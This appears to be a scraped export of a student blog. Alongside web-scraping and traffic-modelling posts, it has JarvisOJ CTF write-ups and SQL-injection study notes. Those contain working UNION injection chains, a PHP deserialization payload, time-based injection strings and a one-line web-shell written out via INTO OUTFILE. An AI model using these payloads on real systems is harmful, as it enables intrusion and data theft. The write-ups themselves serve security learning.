Recorder可以记录操作日志，并生成对应的python代码 具体操作参考https://morvanzhou.github.io/tutorials/data-manipulation/scraping/5-01-selenium/#%E5%81%B7%E6%87%92%E7%9A%84%E7%81%AB%E7%8B%90%E6%B5%8F%E8%A7%88%E5%99%A8%E6%8F%92%E4%BB%B6 安装浏览器驱动，放到置顶位置（可以参考博客中的《爬取机场数据》） rom selenium import webdriverdriver = webdriver.Chrome() # 打开 Chrome 浏览器# 将刚刚复制的帖在这driver.get(\"https://morvanzhou.github.io/\")driver.find_element_by_xpath(u\"//img[@alt='强化学习 (Reinforcement Learning)']\").click()driver.find_element_by_link_text(\"About\").click()driver.find_element_by_link_text(u\"赞助\").click()driver.find_element_by_link_text(u\"教程 ▾\").click()driver.find_element_by_link_text(u\"数据处理 ▾\").click()driver.find_element_by_link_text(u\"网页爬虫\").click()# 得到网页 html, 还能截图html = driver.page_source # get htmldriver.get_screenshot_as_file(\"./img/sreenshot1.png\")driver.close() # 不弹出浏览器from selenium.webdriver.chrome.options import Optionschrome_options = Options()chrome_options.add_argument(\"--headless\") # define headlessdriver = webdriver.Chrome(chrome_options=chrome_options) Senlenium 教学官网：https://selenium-python.readthedocs.io/ Scrapy官网：https://docs.scrapy.org/en/latest/ scrapy学习入门：https://www.jianshu.com/p/a8aad3bf4dc4 研究探索：https://blog.csdn.net/u012150179/article/details/32343635 import scrapyclass MofanSpider(scrapy.Spider): name = \"mofan\" start_urls = [ 'https://morvanzhou.github.io/', ] # unseen = set() # seen = set() # 我们不在需要 set 了, 它自动去重 class MofanSpider(scrapy.Spider): ... def parse(self, response): yield &#123; # return some results 'title': response.css('h1::text').extract_first(default='Missing').strip().replace('\"', \"\"), 'url': response.url, &#125; urls = response.css('a::attr(href)').re(r'^/.+?/$') # find all sub urls for url in urls: yield response.follow(url, callback=self.parse) # it will filter duplication automatically # yield 异步处理 在terminal中 scrapy runspider 5-2-scrapy.py -o res.json","categories":[{"name":"爬虫","slug":"爬虫","permalink":"https://gitee.com/michelle19l/michelle19l/categories/%E7%88%AC%E8%99%AB/"}],"tags":[{"name":"爬虫","slug":"爬虫","permalink":"https://gitee.com/michelle19l/michelle19l/tags/%E7%88%AC%E8%99%AB/"}]},{"title":"机场到港航班数据爬取","slug":"建模/机场到港航班爬取","date":"2020-07-13T05:06:36.000Z","updated":"2020-07-13T09:58:01.358Z","comments":true,"path":"2020/07/13/建模/机场到港航班爬取/","link":"","permalink":"https://gitee.com/michelle19l/michelle19l/2020/07/13/%E5%BB%BA%E6%A8%A1/%E6%9C%BA%E5%9C%BA%E5%88%B0%E6%B8%AF%E8%88%AA%E7%8F%AD%E7%88%AC%E5%8F%96/","excerpt":"","text":"要求描述描述国内某机场每天的人流量变化 采取策略得到所有航线这里我们是选取的城市是深圳，爬取携程的订票系统 我们可以找到一个页面包含了所有到深圳的所有航线 ctrl+U，发现所需要的数据都显示在源码中了，这样我们就可以爬到所有的航线，并输入到一个list中 感谢Sakura提供这部分的代码 # flightlinespider.py# Group: Group bald# Date: 20200712import requestsimport bs4i = 0# 显示所有航线的网页web_url = 'https://flights.ctrip.com/schedule/.szx.html'r = requests.get(web_url)soup = bs4.BeautifulSoup(r.text, \"html5lib\")route_list = []list1 = soup.find_all('a')list2 = soup.find_all('a',&#123;'target':'_blank'&#125;)list3 = list(set(list1).difference(set(list2)))for item in list3: if '-深圳' in item.text: route_list.append(item.text)route_list.sort()# print(route_list) 找到包含航班信息的列 得到一条航线的所有航班 发现这部分没有直接写在网页源码中，而且尝试利用它payload爬取响应失败 我们需要的信息 关于容量我没有找到官方的统计网站，且相同机型的飞机也可能有不同的载客量，所以采取手动查找策略，取大致数值。爬虫只用来爬取前几列 使用selenium库模仿真人操作，拿到网页的显示内容 具体逻辑已经写在代码注释中 我本人在写这个代码的时候也是第一天接触这个库，里面有的内容有点愚蠢（比如连用七个判断hhh）欢迎大家提出建议 环境配置 安装库 安装浏览器驱动，然后放到 anaconda//Lib/site-packages/selenium/webdriver/chrome/中 大致思路，分别爬取页面中的航班号、机型、班期等信息，每个信息（而不是架航班）存到一个list里，然后将保存了各个信息的list放到一个dataframe里面，写入csv # Group: Group bald# Date: 20200712from selenium import webdriverimport timeimport pandas as pdfrom flightlinespider import *import randomclass CTSpider(object): def __init__(self, i): self.i = 0 self.url = 'https://flights.ctrip.com/schedule/.szx.html' self.browser = driver = webdriver.Chrome( r'D:/anaconda/new/Lib/site-packages/selenium/webdriver/chrome/chromedriver.exe') self.index = i # 循环遍历的标记 # 点击特定路线 def get_html(self): self.browser.get(self.url) # 打开url # 查找页面中route_list[index]的路线（文字），点击 self.browser.find_elements_by_link_text(route_list[self.index])[0].click() time.sleep(random.uniform(2, 4)) # 给商品页面加载时间 # 解析页面 def parse_html(self): # 查找到当前访问的网页中class=\"flight_logo\"的部分，返回一个列表 flights = self.browser.find_elements_by_class_name(\"flight_logo\") flightno_list = [] flight_list = [] for flight in flights: # 循环访问列表中的内容 text = flight.text.split('/n机型:') # 用.text提取出文字内容 flightno_list.append(text[0]) # 将所需内容添加到列中 flight_list.append(text[1]) arv = self.browser.find_elements_by_class_name(\"arrive\") arrive_time = [] # 到达时间 arrive_airport = [] # 到达机场 for i in arv: a = i.text.split('/n') # 爬取到的内容每条间会有换行 arrive_time.append(a[0]) arrive_airport.append(a[1]) # 找到所有的class为week的部分 flights = self.browser.find_elements_by_class_name(\"weeks\") flights = flights[1:] # flihts[0]为表头，去除 week_list_mon = [] # 班期 week_list_tue = [] # 这段就是非常愚蠢的代码，如果有改良的方法欢迎给我发邮件或者私信我 week_list_wed = [] # 我不知道怎么生成低维不定长的二维数组 week_list_thu = [] week_list_fri = [] week_list_sat = [] week_list_sun = [] # 将数字和星期几对应，方便后续处理 dic = &#123;0: '一', 1: '二', 2: '三', 3: '四', 4: '五', 5: '六', 6: '日'&#125; dic_ = &#123;'一': 0, '二': 1, '三': 2, '四': 3, '五': 4, '六': 5, '日': 6&#125; # 若周一有班次，则\"一\"的class为\"blue\",否则为空 # 在每个块（flight）里继续查找class=\"blue\"即当日有班次的航班 for flight in flights: weeks = flight.find_elements_by_class_name(\"blue\") weekli = [] for i in weeks: # 将单个航班中显示为蓝色的星期几的文字调整为列表 weekli.append(i.text) # 例如，如果一三五有班期，则weekli=['一','三','五'] m = 0 if dic[m] in weekli: # 如果weekli中包含周一 week_list_mon.append(1) # 则周一的列表中添加元素1 else: # 否则周一的列表中添加元素0 week_list_mon.append(0) m = 1 # 周二 if dic[m] in weekli: week_list_tue.append(1) else: week_list_tue.append(0) m = 2 if dic[m] in weekli: week_list_wed.append(1) else: week_list_wed.append(0) m = 3 if dic[m] in weekli: week_list_thu.append(1) else: week_list_thu.append(0) m = 4 if dic[m] in weekli: week_list_fri.append(1) else: week_list_fri.append(0) m = 5 if dic[m] in weekli: week_list_sat.append(1) else: week_list_sat.append(0) m = 6 # 周日 if dic[m] in weekli: week_list_sun.append(1) else: week_list_sun.append(0) # 准点率 punc = self.browser.find_elements_by_class_name(\"punctuality\") punc_list = [] for i in punc: if i.text != '准点率': punc_list.append(i.text) # 将数据放到一个database里面 data = &#123;'航班号':flightno_list,'机型': flight_list, '到达时间': arrive_time, '到达机场': arrive_airport,'周一': week_list_mon, '周二': week_list_tue, '周三': week_list_wed, '周四': week_list_thu, '周五': week_list_fri, '周六': week_list_sat, '周日': week_list_sun, '准点率': punc_list&#125; df = pd.DataFrame(data) df=df.drop_duplicates() # 去除由于“经停”带来的重复数据 df.to_csv('Data3.csv', mode='a', header=False) # 以追加方式写入文件 # 主函数 def main(self): self.get_html() self.parse_html()if __name__ == '__main__': global route_list for i in range(0, len(route_list)): print(i, route_list[i]) # 打印进度，如果中间出现问题，调整后可以从出错处继续运行 spider = CTSpider(i) spider.main() 拿到了数据 太难了 今日感悟 要么爬，要么爬","categories":[{"name":"爬虫","slug":"爬虫","permalink":"https://gitee.com/michelle19l/michelle19l/categories/%E7%88%AC%E8%99%AB/"}],"tags":[{"name":"爬虫","slug":"爬虫","permalink":"https://gitee.com/michelle19l/michelle19l/tags/%E7%88%AC%E8%99%AB/"},{"name":"动态网页爬取","slug":"动态网页爬取","permalink":"https://gitee.com/michelle19l/michelle19l/tags/%E5%8A%A8%E6%80%81%E7%BD%91%E9%A1%B5%E7%88%AC%E5%8F%96/"},{"name":"建模","slug":"建模","permalink":"https://gitee.com/michelle19l/michelle19l/tags/%E5%BB%BA%E6%A8%A1/"},{"name":"数据采集","slug":"数据采集","permalink":"https://gitee.com/michelle19l/michelle19l/tags/%E6%95%B0%E6%8D%AE%E9%87%87%E9%9B%86/"}]},{"title":"元胞自动机","slug":"建模/元胞自动机","date":"2020-07-10T09:46:43.000Z","updated":"2020-07-13T09:59:59.342Z","comments":true,"path":"2020/07/10/建模/元胞自动机/","link":"","permalink":"https://gitee.com/michelle19l/michelle19l/2020/07/10/%E5%BB%BA%E6%A8%A1/%E5%85%83%E8%83%9E%E8%87%AA%E5%8A%A8%E6%9C%BA/","excerpt":"","text":"内容来自： https://www.zhihu.com/question/21929655 演化规则（二维） 活细胞周围的细胞数小于2个或多于3个则死亡； 活细胞周围有2或3个细胞可以继续存活； 死细胞周围恰好有3个细胞则会复活。 在交通领域的应用 经典的NaSch模型，模拟了车辆在一维高速公路上的行驶状态 将CA模型推广到二维，可以仿真换道的行人流或车流 通过设置更复杂的规则，可以用元胞自动机仿真更真实的情况。例如在对向行走的行人流情境下，元胞们会仿真行人的排队特性，从而避免冲突相撞。 Python代码NaSch模型 老规矩，先调包，并创建一个图像 import matplotlib as mplimport matplotlib.pyplot as pltimport random# 创建图像fig = plt.figure(figsize=(10,1)) 设置模型的参数，相当于一个遥控器，哪里不对点哪里~ # 模型参数设置numofcell = 20 # 道路长度numofcar = 12 # 空间中的车辆数max_time = 100 # 设置最大时间步max_speed = 5 # 允许的车辆最大速度p_slowdown = 0.3 # 随机慢化概率pause_time = 0.1 # 刷新时间（每一帧持续的时间）cell_size = 15 # 元胞的大小 定义一个函数来构建一维空间，空间的长度就是道路长度，相当于用一系列和X轴或Y轴平行的直线，绘制一排小网格，每个小网格的中心，相当于(i,0)，其中，i=1,2,…,numofcell # 函数：构建一维空间def Plot_Space(): for i in range(1, numofcell): plt.plot([i-0.5, i-0.5], [-0.5, 0.5], '-k', linewidth = 0.5) plt.axis([-0.5, numofcell-0.5, -0.5, 0.5])plt.xticks([]);plt.yticks([]) ) 定义一个函数来获取和前车的距离，从而避免两车相撞。在这里采用了周期性边界，即从道路末端驶出的小车会重新回到起点，相当于一个环路。 # 函数：获取和前车的距离def get_empty_front(link, numofcell, indexofcell): link2 = link * 2 # 周期性边界 num = 0; i = 1 while (link2[indexofcell + i]) == None: num += 1; i += 1 return num 在道路空间中随机生成numofcar个初始元胞，并赋予随机的初始速度（不大于已经设置好的最大速度）。道路被车辆占有的状态储存在列表link中，若元胞中没有车辆，则link对应的位置为“None”；若元胞中有车，link对应的位置储存车辆的速度。（可以开开脑洞，大胆地尝试不同初始状态噢） # 随机生成初始元胞Plot_Space()link = [None] * numofcellnum = 0while num != numofcar: sj = random.randint(0, numofcell - 1) if link[sj] == None: link[sj] = random.randint(0, 5) num += 1 在0~max_time的时间步内，进行NaSch模型的演化，模型演化的四个步骤： 加速：若还没到速度最大值，速度就加1 减速：如果速度值大于前方的空元胞数，有撞车风险，则减速至前方的空元胞数目 随机慢化：司机以p_slowdown的概率随机踩刹车，使速度减1 位置更新：新的位置为当前位置+当前速度，同时更新所有车辆的位置 # NaSch模型for t in range(0, max_time): for cell in range(0, numofcell): if link[cell] != None: # 加速 link[cell] = min(link[cell] + 1, max_speed) # 减速 link[cell] = min(link[cell], get_empty_front(link, numofcell, cell)) # 随机慢化 if random.random() &lt;= p_slowdown: link[cell] = max(link[cell] - 1, 0) # 位置更新 nlink = [None] * numofcell for cell in range(0, numofcell): if link[cell] != None: new_index = cell + link[cell] if new_index &gt;= numofcell: new_index -= numofcell nlink[new_index] = link[cell] link = nlink 绘制当前时间步车辆位置的图像，注意这里有缩进，说明上一段NaSch模型演化代码中的for循环还没有结束呦~ x1 = [] for i in range(0,len(link)): if link[i] != None: x1.append(i) Plot_Space() plt.plot(x1, [0] * numofcar, 'sk', markersize=cell_size) plt.xlabel('timestep:' + str(t)) 让图片动起来（同样注意缩进），plt.pause()函数让当前的图像维持pause_time长的时间，随后plt.cla()函数将整个图像擦除。下一个时间步，继续绘制图像，保留一段时间，并擦除，再绘制图像……就能源源不断地产生动画啦！你学会了吗？ plt.pause(pause_time)plt.cla() 终于写完代码啦，RUN一下！ 仔细看，拥堵带也会跳鬼步舞，逐渐向后传播的。 操控我的“遥控器”，给它一个初始状态，就可以开启“阅兵模式”啦，你猜我是怎么做到的？ 给我开“瞬移”挂，只要动的足够快，你就分不清我到底是往左跑还是往右跑 内容参考http://wulixb.iphy.ac.cn/fileWLXB/journal/article/wlxb/2001/3/PDF/w20010315.pdf 如果说上车到出发需要一个时间单位 1 2 3 4 5(乘车点) 6 o o o o","categories":[{"name":"建模","slug":"建模","permalink":"https://gitee.com/michelle19l/michelle19l/categories/%E5%BB%BA%E6%A8%A1/"}],"tags":[{"name":"建模","slug":"建模","permalink":"https://gitee.com/michelle19l/michelle19l/tags/%E5%BB%BA%E6%A8%A1/"},{"name":"元胞自动机","slug":"元胞自动机","permalink":"https://gitee.com/michelle19l/michelle19l/tags/%E5%85%83%E8%83%9E%E8%87%AA%E5%8A%A8%E6%9C%BA/"}]},{"title":"php/进展","slug":"php/进展","date":"2020-06-19T08:10:25.338Z","updated":"2020-06-19T08:10:25.338Z","comments":true,"path":"2020/06/19/php/进展/","link":"","permalink":"https://gitee.com/michelle19l/michelle19l/2020/06/19/php/%E8%BF%9B%E5%B1%95/","excerpt":"","text":"2020/6/5 本周进展 php学习完了基本语法和流程控制结构 现在正在看函数，完成了php计算器和while循环输出表格的复现 大致过了一下漏测课上讲的http内容 这周一直在忙数学作业和国创项目答辩，学的不是很多，周末补上 2020/6/12 php看完了函数，php匿名函数和闭包还需要再看看 漏洞利用与渗透测试课做了反序列化攻击、sql注入、跨站脚本攻击实验，并写了实验报告这个学期的课程都上完了，总结了以下漏测课这个学期做的实验https://michelle19l.gitee.io/categories/%E6%BC%8F%E6%B4%9E%E6%B5%8B%E8%AF%95%E4%BD%9C%E4%B8%9A/数据库课程完成了大作业，flask+mysql数据库管理系统 2020/6/19 本周看了sql注入的前两章，现在正在看第三章 对着题解写了五个jarvisoj的web题，总结了解题过程和知识点","categories":[],"tags":[]},{"title":"kali pip安装","slug":"pip安装","date":"2020-06-17T05:06:36.000Z","updated":"2020-06-17T08:29:20.443Z","comments":true,"path":"2020/06/17/pip安装/","link":"","permalink":"https://gitee.com/michelle19l/michelle19l/2020/06/17/pip%E5%AE%89%E8%A3%85/","excerpt":"","text":"wget https://bootstrap.pypa.io/get-pip.py python3 get-pip.py 添加环境变量 vim /etc/profile,添加warning中的内容，如果没有则掠过 pip -V测试安装是否成功","categories":[{"name":"kali","slug":"kali","permalink":"https://gitee.com/michelle19l/michelle19l/categories/kali/"}],"tags":[{"name":"kali","slug":"kali","permalink":"https://gitee.com/michelle19l/michelle19l/tags/kali/"}]},{"title":"JARVISOJ WEB题目学习","slug":"jarvisoj/jarvisoj_web","date":"2020-06-16T03:03:03.000Z","updated":"2020-06-20T08:51:07.123Z","comments":true,"path":"2020/06/16/jarvisoj/jarvisoj_web/","link":"","permalink":"https://gitee.com/michelle19l/michelle19l/2020/06/16/jarvisoj/jarvisoj_web/","excerpt":"","text":"PORT51 题目链接：http://web.jarvisoj.com:32774/ 参考题解：https://blog.csdn.net/weixin_44077544/article/details/89407287 打开之后显示 curl命令：curl http://xxxxxx返回该网页的html–local-port 强制使用本地端口号 输入 curl --local-port 51 http://web.jarvisoj.com:32770/ 返回 LOCALHOST 题目链接：http://web.jarvisoj.com:32774/ 参考题解：https://www.cnblogs.com/IMBlackMs/p/11272848.html 题目分析只允许本机登录 考虑添加header: Ｘ-Forward-For 127.0.0.1 来构造一个“原始客户端为localhost”的报文，达到access的目的 设置代理、抓包 打开burpsuite，勾选127.0.0.1:8080 调整至intercept is on，进行抓包 添加header，点击forward发送 得到flag LOGIN burpsuite md5 打开proxy-options-intercept server responses 看到hint Hint: &quot;select * from &#96;admin&#96; where password&#x3D;&#39;&quot;.md5($pass,true).&quot;&#39;&quot; &lt;?php for ($i = 0;;) &#123; for ($c = 0; $c &lt; 1000000; $c++, $i++) if (stripos(md5($i, true), '\\'or\\'') !== false) echo \"\\nmd5($i) = \" . md5($i, true) . \"\\n\"; echo \".\";&#125;?&gt; （这个代码我没有跑出来，TLE了） ffifdyop 神盾局的秘密 文件包含漏洞 序列化 题目链接：http://web.jarvisoj.com:32768/ 参考题解：https://blog.csdn.net/qq1045553189/article/details/87562204?utm_medium=distribute.pc_relevant.none-task-blog-baidujs-1 打开后是一张图片 查看网页源代码，发现showing.php,和一张base64编码的img，解密后是shield.jpg 点进去，发现是图片编码 判断是文件包含漏洞 尝试读取showimg.php view-source:http:&#x2F;&#x2F;web.jarvisoj.com:32768&#x2F;showimg.php?img&#x3D;c2hvd2ltZy5waHA&#x3D; &lt;?php $f = $_GET['img']; if (!empty($f)) &#123; $f = base64_decode($f); if (stripos($f,'..')===FALSE &amp;&amp; stripos($f,'/')===FALSE &amp;&amp; stripos($f,'\\\\')===FALSE &amp;&amp; stripos($f,'pctf')===FALSE) &#123; readfile($f); &#125; else &#123; echo \"File not found!\"; &#125; &#125;?&gt; stripos查找字符串首次出现的位置（不区分大小写） 代码中过滤掉了.. / \\\\(切换目录的字符) 和pctf 尝试获取index.php(aW5kZXgucGhw) view-source:http:&#x2F;&#x2F;web.jarvisoj.com:32768&#x2F;showimg.php?img&#x3D;aW5kZXgucGhw &lt;?php require_once('shield.php'); $x = new Shield(); isset($_GET['class']) &amp;&amp; $g = $_GET['class']; if (!empty($g)) &#123; $x = unserialize($g);\\\\反序列化 &#125; echo $x-&gt;readfile();?&gt;&lt;img src=\"showimg.php?img=c2hpZWxkLmpwZw==\" width=\"100%\"/&gt; 使用GET传参，参数名‘class’ 读shield.php http:&#x2F;&#x2F;web.jarvisoj.com:32768&#x2F;showimg.php?img&#x3D;c2hpZWxkLnBocA&#x3D;&#x3D; &lt;?php //flag is in pctf.php class Shield &#123; public $file; function __construct($filename = '') &#123; $this -&gt; file = $filename; &#125; function readfile() &#123; if (!empty($this-&gt;file) &amp;&amp; stripos($this-&gt;file,'..')===FALSE &amp;&amp; stripos($this-&gt;file,'/')===FALSE &amp;&amp; stripos($this-&gt;file,'\\\\')==FALSE) &#123; return @file_get_contents($this-&gt;file); &#125; &#125; &#125;?&gt; showimg.php对pctf进行了过滤，但是readfile()没有 编写php脚本，得到序列化后的shield实例 &lt;?php //flag is in pctf.php class Shield &#123; public $file; function __construct($filename = '') &#123; $this -&gt; file = $filename; &#125; function readfile() &#123; if (!empty($this-&gt;file) &amp;&amp; stripos($this-&gt;file,'..')===FALSE &amp;&amp; stripos($this-&gt;file,'/')===FALSE &amp;&amp; stripos($this-&gt;file,'\\\\')==FALSE) &#123; return @file_get_contents($this-&gt;file); &#125; &#125; &#125; $x=new Shield (\"pctf.php\"); echo serialize($x);?&gt; 得到序列化结果 O:6:&quot;Shield&quot;:1:&#123;s:4:&quot;file&quot;;s:8:&quot;pctf.php&quot;;&#125; 访问 http:&#x2F;&#x2F;web.jarvisoj.com:32768&#x2F;index.php?class&#x3D;O:6:%22Shield%22:1:&#123;s:4:%22file%22;s:8:%22pctf.php%22;&#125; IN A MESS 题目链接：http://web.jarvisoj.com:32780/ 题解链接：https://blog.csdn.net/wyj_1216/article/details/82954242 查看源码 查看index.phps 转载自：https://www.jianshu.com/p/cb124701a5d8 1.stripos(字符串a，字符串b)函数查找字符串b在字符串a中第一次出现的位置（不区分大小写）2.file_get_contents 将整个文件读入一个字符串3.eregi(&quot;111&quot;.substr($b,0,1),&quot;1114&quot;) 判断”1114”这个字符串里面是否有符合”111”.substr($b,0,1)这个规则的 注，php5.3以后不支持eregi 参数 要求 id id==0 前面有非零的判断，所以用0e或‘0’绕过 b strlen($b)&gt;5 and eregi(“111”.substr($b,0,1),”1114”) and substr($b,0,1)!=4 这里要求：b的长度大于5，且是基于eregi函数的弱类型，用%00的绕过（ strlen函数对%00不截断但substr截断）那么可以令b=%00411111 a 由data进行赋值：$data = @file_get_contents($a,&#39;r&#39;) 而又有$data==&quot;1112 is a nice lab!&quot; 可以利用远程文件包含在allow_url_include开启时可以使用，但发现对$a有了.过滤所以还是data协议比较稳妥 data类型的URL格式：https://blog.csdn.net/lxgwm2008/article/details/38437875 对于一些小数据，可以在网页中直接嵌入，而不是从外部文件载入，减少服务器负载 例如直接在浏览器输入data:text/html,Hello, world! 或者运行 （Url是一种基于文本的协议，所以gif/png/jpeg这种二进制属于需要用base64进行编码。换句话说，引入base64以后，就可以支持任意形式的数据格式。） &lt;!DOCTYPE html PUBLIC \"-//W3C//DTD XHTML 1.0 Transitional//EN\" \"http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd\"&gt;&lt;html xmlns=\"http://www.w3.org/1999/xhtml\" &gt;&lt;head&gt;&lt;style type=\"text/css\"&gt;.title &#123; background-image:url(data:image/gif;base64,R0lGODlhAQAcALMAAMXh96HR97XZ98Hf98Xg97DX97nb98Lf97vc98Tg973d96rU97ba97%2Fe96XS9wAAACH5BAAAAAAALAAAAAABABwAAAQVMLhVBDNItXESAURyDI2CGIxQLE4EADs%3D); background-repeat:repeat-x; height:28px; line-height: 28px; text-align:center;&#125;&lt;/style&gt;&lt;/head&gt; &lt;body&gt; &lt;div class=\"title\"&gt;Hello, world!&lt;/div&gt;&lt;/body&gt;&lt;/html&gt; 可以看到 data类型的Url大致有以下几种形式 data:,&lt;文本数据&gt;data:text/plain,&lt;文本数据&gt;data:text/html,&lt;HTML代码&gt;data:text/html;base64,&lt;base64编码的HTML代码&gt;data:text/css,&lt;CSS代码&gt;data:text/css;base64,&lt;base64编码的CSS代码&gt;data:text/javascript,&lt;Javascript代码&gt;data:text/javascript;base64,&lt;base64编码的Javascript代码&gt;data:image/gif;base64,base64编码的gif图片数据data:image/png;base64,base64编码的png图片数据data:image/jpeg;base64,base64编码的jpeg图片数据data:image/x-icon;base64,base64编码的icon图片数据 输入?id=0e&amp;a=data:,1112 is a nice lab!&amp;b=%00411111,返回 {/^HT2mCpcvOLf} 不像flag，像一个目录，于是，尝试在地址栏输入：http://web.jarvisoj.com:32780/^HT2mCpcvOLf 返回 发现跳转后自动补id=1，考虑sql注入 尝试id=1 or 1=1 怀疑空格有问题，用/\\/代替 还是不行，可能过滤了**,改为/*1*/,显示正常 and 1=1也没问题，and 1=2报错 输入id=1/*1*/order/*1*/by/*1*/3显示正常，但是4报错，说明有三个字段 下面开始爆数据库： id&#x3D;-1&#x2F;*12*&#x2F;uniunionon&#x2F;*12*&#x2F;seselectlect&#x2F;*12*&#x2F;1,2,(database())%23 得到数据库名test 接下来开始爆表名： id&#x3D;-1&#x2F;*12*&#x2F;uniunionon&#x2F;*12*&#x2F;seselectlect&#x2F;*12*&#x2F;1,2,(seselectlect&#x2F;*12*&#x2F;group_concat(table_name)&#x2F;*12*&#x2F;frfromom&#x2F;*12*&#x2F;information_schema.tables&#x2F;*12*&#x2F;where&#x2F;*12*&#x2F;table_schema&#x3D;database())%23 得到表名：content 接下来爆列名： id&#x3D;-1&#x2F;*12*&#x2F;uniunionon&#x2F;*12*&#x2F;seselectlect&#x2F;*12*&#x2F;1,2,(selselectect&#x2F;*12*&#x2F;group_concat(column_name)&#x2F;*12*&#x2F;frofromm&#x2F;*12*&#x2F;information_schema.columns&#x2F;*12*&#x2F;where&#x2F;*12*&#x2F;table_name&#x3D;0x636f6e74656e74)%23 得到列名：context 读取内容： id&#x3D;-1&#x2F;*12*&#x2F;uniunionon&#x2F;*12*&#x2F;seselectlect&#x2F;*12*&#x2F;1,2,(selselectect&#x2F;*12*&#x2F;context&#x2F;*12*&#x2F;frofromm&#x2F;*1*&#x2F;content)%23 RE? 连接：https://dn.jarvisoj.com/challengefiles/udf.so.02f8981200697e5eeb661e64797fc172 参考题解：https://www.jianshu.com/p/e4d61c50cb67?utm_campaign=maleskine&amp;utm_content=note&amp;utm_medium=seo_notes&amp;utm_source=recommendation udf.so是linux上的mysql函数 先在阿里云上拉一个docker docker pull mysql docker run -p 3306:3306 --name ctf-mysql -v D:\\security\\docker:&#x2F;tmp -e LANG&#x3D;C.UTF-8 -e MYSQL_ROOT_PASSWORD&#x3D;123456 -d mysql 根据题解运行没有成功，先放下回来再说。","categories":[{"name":"CTF","slug":"CTF","permalink":"https://gitee.com/michelle19l/michelle19l/categories/CTF/"}],"tags":[{"name":"web","slug":"web","permalink":"https://gitee.com/michelle19l/michelle19l/tags/web/"},{"name":"CTF","slug":"CTF","permalink":"https://gitee.com/michelle19l/michelle19l/tags/CTF/"}]},{"title":" sql注入攻击与防御","slug":"sqli/sql注入攻击与防御","date":"2020-06-15T03:03:03.000Z","updated":"2020-07-31T11:11:01.603Z","comments":true,"path":"2020/06/15/sqli/sql注入攻击与防御/","link":"","permalink":"https://gitee.com/michelle19l/michelle19l/2020/06/15/sqli/sql%E6%B3%A8%E5%85%A5%E6%94%BB%E5%87%BB%E4%B8%8E%E9%98%B2%E5%BE%A1/","excerpt":"","text":"第二章知识点回忆 利用having ‘1’=’1 列举列名xxx， group by xxx having ‘1’=’1列举下一个列名 http://xxxxxxxxx?id=xxx&#39; group by xxx having ‘1’=’1’ http://xxxxxxxxx?id=xxx; select * from users having 1=1;– 0/xxx 列举表中的数值 http://xxxxxxxxx?id=xxx&#39; and 1=0/name;– 通过注入单引号后页面返回的错误判断数据库类型，mysql？oracle？等（书P33） 输入user’ or 1=1返回所有页面，and 1=1返回单个商品 判断?id=3-1是否与?id=2返回相同的页面，如果相同。则可以直接进行减法运算 加法也课尝试，但是+是URI保留字，可以用%2B代替 区分数值型注入和字符串型注入（有无单引号） 所有的数据库都可以使用”–“进行单行注释，”/**/“进行多行注释，其中mysql还可以用#进行单行注释 若空格被过滤，则可以使用没有内容的多行注释来避免使用空格 ?uid=45/**/or/**/1=1 输入?uid=45/*hello yes*/,若返回内容与uid=45相同，则说明注释成功，可能存在sql注入 ?s=test’; select ‘&lt;php echo shell_exec($_GET[“cmd”]);?&gt;’ into outfile ‘/var/www/victim.com/shell.php’;– 检索名为cmd的GET参数的值在一个操作系统shell中加以执行，并写入文件中 时间延迟 服务器种类 语句 sql server ?uid=45; waitfor delay ‘hours:minutes:seconds’ mysql ?uid=45; select benchmark(100000,encode(‘hello’,’mom)) oracle pl/sql ?uid=45 or 1=dbms_pipe.receive_message（‘RDS’,10) postgresql(&gt;=8.2) select pf_sleep(10);– 第三章 复查代码中的SQL注入 造成sql注入的原因是没有对输入进行检查 手动检查代码（静态）可以利用grep命令检查是否直接使用了没有检查过的输入参数，可以配合grep命令进行筛查，注意不同数据库有不同的处理函数 （具体指令在书上做了标记，内容比较多，就不抄过来了） 也可以使用一些工具搭配owasp进行练习 第四章 利用SQL注入 堆叠查询：执行多条sql语句 非盲跟踪：利用报错信息判断是什么数据库 P116，获取version信息 id=@@version name=’%2B@@version%2B’ 查看字符串的衔接方式，判断数据库种类 利用数字函数判断数据库种类 UNION判断列 id=12+union+select+null – 利用null的个数判断列 order by 判断列数（效率更高）二分查找 匹配数据类型 id=12+union+select+’test’,null,null,null 得到更多信息 id=12+union+select+NULL,system_user,db_nam(),NULL 使用连接符运行多个请求 （SQL Server） SELECT NULL, system_user + ‘|’ +db_name(), NULL,NULL union查询只显示第一行 添加永假条件，只返回union后面的结果(第一条) id=12+and+1=0+union+select+NULL,system_user,NULL,NULL 然后再在后面的查询中对查询结果进行约束，可以得到后面的结果 基于时间： id=12;if+(system_user=’sa’)+waitfor+delay+’0:0:5’– 检查数据库版本信息 if (substring((select @@version),25,1)=5) waitfor delay ‘0:0:5’– 查询information_schema","categories":[{"name":"sqli","slug":"sqli","permalink":"https://gitee.com/michelle19l/michelle19l/categories/sqli/"}],"tags":[{"name":"web","slug":"web","permalink":"https://gitee.com/michelle19l/michelle19l/tags/web/"},{"name":"sqli","slug":"sqli","permalink":"https://gitee.com/michelle19l/michelle19l/tags/sqli/"}]},{"title":"漏洞测试作业十三：复现反序列化漏洞","slug":"漏测作业/漏测作业十三","date":"2020-06-12T04:36:09.000Z","updated":"2020-06-12T04:21:02.779Z","comments":true,"path":"2020/06/12/漏测作业/漏测作业十三/","link":"","permalink":"https://gitee.com/michelle19l/michelle19l/2020/06/12/%E6%BC%8F%E6%B5%8B%E4%BD%9C%E4%B8%9A/%E6%BC%8F%E6%B5%8B%E4%BD%9C%E4%B8%9A%E5%8D%81%E4%B8%89/","excerpt":"","text":"题目复现11.2.3中的反序列化漏洞，并执行其他的系统命令 解答/*typecho.php*/&lt;?phpclass Typecho_Db&#123; public function __construct($adapterName)&#123; $adapterName = 'Typecho_Db_Adapter_' . $adapterName; &#125;&#125;class Typecho_Feed&#123; private $item; public function __toString()&#123; $this-&gt;item['author']-&gt;screenName; &#125;&#125;class Typecho_Request&#123; private $_params = array(); private $_filter = array(); public function __get($key) &#123; return $this-&gt;get($key); &#125; public function get($key, $default = NULL) &#123; switch (true) &#123; case isset($this-&gt;_params[$key]): $value = $this-&gt;_params[$key]; break; default: $value = $default; break; &#125; $value = !is_array($value) &amp;&amp; strlen($value) &gt; 0 ? $value : $default; return $this-&gt;_applyFilter($value); &#125; private function _applyFilter($value) &#123; if ($this-&gt;_filter) &#123; foreach ($this-&gt;_filter as $filter) &#123; $value = is_array($value) ? array_map($filter, $value) : call_user_func($filter, $value); &#125; $this-&gt;_filter = array(); &#125; 